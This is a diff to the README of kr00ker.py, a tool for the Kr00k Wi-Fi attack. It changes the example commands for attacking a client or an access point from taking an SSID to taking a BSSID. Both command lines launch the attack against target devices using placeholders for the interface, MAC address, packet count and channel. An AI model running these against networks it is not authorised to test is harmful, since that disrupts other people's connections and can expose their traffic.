@@ -45,11 +45,11 @@ Use the "--help" option for a more exhaustive list.
 
 Launch the Kr00k attack against the client (-t client) device:
 ```
-# python3 kr00ker.py -i <interface-name> -s <SSID> -c <MAC-client> -n <num-packets> -r <reason-id> -t client -w <wifi-channel> -d <delay>
+# python3 kr00ker.py -i <interface-name> -b <BSSID> -c <MAC-client> -n <num-packets> -r <reason-id> -t client -w <wifi-channel> -d <delay>
 ```
 or launch the Kr00k attack against the Access Point (-t ap) device:
 ```
-$ sudo python3 kr00ker.py -i <interface-name> -s <SSID> -c <MAC-client> -n <num-packets> -r <reason-id> -t ap -w <wifi-channel> -d <delay>
+$ sudo python3 kr00ker.py -i <interface-name> -b <BSSID> -c <MAC-client> -n <num-packets> -r <reason-id> -t ap -w <wifi-channel> -d <delay>
 ```
 
 
